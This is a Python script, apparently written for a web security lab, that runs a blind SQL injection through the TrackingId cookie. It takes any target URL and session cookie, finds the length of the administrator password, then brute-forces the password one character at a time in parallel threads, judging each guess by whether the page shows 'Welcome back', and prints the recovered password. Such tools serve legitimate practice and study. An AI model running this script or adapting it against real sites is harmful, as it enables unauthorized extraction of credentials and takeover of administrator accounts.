#!/usr/bin/env python3

from pwn import *
from termcolor import colored
from concurrent.futures import ThreadPoolExecutor, as_completed
import requests
import sys
import signal
import string
import time

CHARACTERS   = string.ascii_lowercase + string.digits
MAX_LEN      = 50
THREADS      = 10     # requests en paralelo por posición
TIMEOUT      = 10

# ─────────────────────────────────────────────
# Input interactivo
# ─────────────────────────────────────────────

def get_config():
    print(colored("\n" + "═"*50, 'cyan'))
    print(colored("  Blind SQLi — Conditional Responses", 'cyan'))
    print(colored("═"*50 + "\n", 'cyan'))

    target   = input(colored("[?] Target URL: ", 'yellow')).strip().rstrip('/') + '/'
    tracking = input(colored("[?] TrackingId (valor original): ", 'yellow')).strip()
    session  = input(colored("[?] Session cookie: ", 'yellow')).strip()

    print()
    return target, tracking, session

# ─────────────────────────────────────────────
# Handler Ctrl+C
# ─────────────────────────────────────────────
def def_handler(sig, frame):
    print(colored(f"\n\n[!] Saliendo...\n", 'red'))
    p1.failure("Ataque detenido")
    sys.exit(1)

signal.signal(signal.SIGINT, def_handler)

# ─────────────────────────────────────────────
# Request con retry automático
# ─────────────────────────────────────────────
def safe_request(target, cookies, retries=3):
    for attempt in range(retries):
        try:
            r = requests.get(target, cookies=cookies, timeout=TIMEOUT)
            return r
        except requests.exceptions.Timeout:
            if attempt == retries - 1:
                return None
            time.sleep(1)
        except requests.exceptions.RequestException:
            return None
    return None
  
# ─────────────────────────────────────────────
# Detectar largo — 1 request por largo, sin iterar caracteres
# ─────────────────────────────────────────────
  
def getPasswordLen(target, tracking, session):
    p1.status("Detectando largo de la contraseña...")

    for length in range(1, MAX_LEN + 1):
        payload = (
            f"{tracking}' and "
            f"(select length(password) from users "
            f"where username='administrator')={length}-- -"
        )

        cookies = {
            'TrackingId': payload,
            'session':    session
        }

        p1.status(f"Detectando largo... probando {length}")

        r = safe_request(target, cookies)
        if r is None:
            p1.failure("Error de conexión al detectar largo")
            sys.exit(1)

        if "Welcome back" in r.text:
            p1.success(f"Largo de la contraseña: {length}")
            return length

    p1.failure(f"No se pudo detectar el largo (máximo {MAX_LEN})")
    sys.exit(1)

# ─────────────────────────────────────────────
# Worker — prueba un solo carácter en una posición
# ─────────────────────────────────────────────
def try_char(target, tracking, session, position, character):
    payload = (
        f"{tracking}' and "
        f"(select substring(password,{position},1) "
        f"from users where username='administrator')="
        f"'{character}'-- -"
    )

    cookies = {
        'TrackingId': payload,
        'session':    session
    }

    r = safe_request(target, cookies)
    if r and "Welcome back" in r.text:
        return character
    return None
  
# ─────────────────────────────────────────────
# Core — paraleliza los caracteres por posición
# ─────────────────────────────────────────────

def makeSQLI(target, tracking, session, password_len):
    password = ""
    p1.status("Iniciando fuerza bruta...")
    time.sleep(1)

    for position in range(1, password_len + 1):
        found = False
        p1.status(f"[pos {position}/{password_len}] ...")

        with ThreadPoolExecutor(max_workers=THREADS) as executor:
            futures = {
                executor.submit(try_char, target, tracking, session, position, ch): ch
                for ch in CHARACTERS
            }

            for future in as_completed(futures):
                result = future.result()
                if result:
                    password += result
                    p2.status(password)
                    found = True
                    executor.shutdown(wait=False, cancel_futures=True)
                    break

        if not found:
            p1.failure(f"No se encontró carácter en posición {position}")
            print(colored(f"\n[!] Contraseña parcial hasta aquí: {password}\n", 'yellow'))
            sys.exit(1)

    # ─── Resultado final ───
    p1.success("¡Listo!")
    p2.success(password)
    print(colored(f"\n[+] Contraseña del administrator: {password}\n", 'green'))

# ─────────────────────────────────────────────
if __name__ == '__main__':
    target, tracking, session = get_config()

    p1 = log.progress("SQLI")
    p2 = log.progress("Password")

    password_len = getPasswordLen(target, tracking, session)
    makeSQLI(target, tracking, session, password_len)
